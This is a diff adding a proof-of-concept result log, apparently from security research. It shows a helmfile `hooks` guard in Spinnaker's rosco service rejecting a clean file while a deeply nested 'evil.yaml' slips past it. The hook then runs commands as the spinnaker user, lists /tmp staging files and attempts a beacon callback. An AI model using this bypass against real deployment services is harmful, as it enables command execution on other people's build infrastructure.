@@ -1,0 +1,22 @@
+################## CONTROL  (parseable, guard must reject)   (clean.yaml)
+HTTP=400 bytes=569
+--- response (first 300 chars) ---
+{"timestamp":"2026-09-19T03:43:34.088+00:00","status":400,"error":"Bad Request","exception":"java.lang.IllegalArgumentException","message":"The helmfile content at /tmp/rosco-17605058991659478014/fdd2c6d1-b5cd-4073-8f68-48b16f19085b declares `hooks`, which helmfile executes as an arbitrary local com
+--- hook side effect ---
+  [ok] no marker - hook did not run
+
+################## PAYLOAD  (deep nesting, guard fails open)   (evil.yaml)
+HTTP=200 bytes=249
+--- response (first 300 chars) ---
+{"type":"embedded/base64","customKind":false,"name":"poc-manifests","reference":"LS0tCiMgU291cmNlOiBkZW1vL3RlbXBsYXRlcy9jbS55YW1sCmFwaVZlcnNpb246IHYxCmtpbmQ6IENvbmZpZ01hcAptZXRhZGF0YToKICBuYW1lOiBkZW1vCmRhdGE6CiAgaGVsbG86IHdvcmxkCgo=","metadata":{}}
+--- hook side effect ---
+  [!!] COMMAND EXECUTED - marker present:
+      === F-01 rosco helmfile hook executed ===
+      uid=10111(spinnaker) gid=10111(spinnaker) groups=10111(spinnaker),10111(spinnaker)
+      44c48ade52c2
+      44c48ade52c2
+      Sat Sep 19 03:43:34 UTC 2026
+      cwd=/tmp/rosco-18318496637419916271
+      staging=/tmp/ROSCO_UI_POC.txt /tmp/bake_resp.json /tmp/bakeenv /tmp/helmfile3048360793 /tmp/hsperfdata_spinnaker 
+      beacon_http=404
+
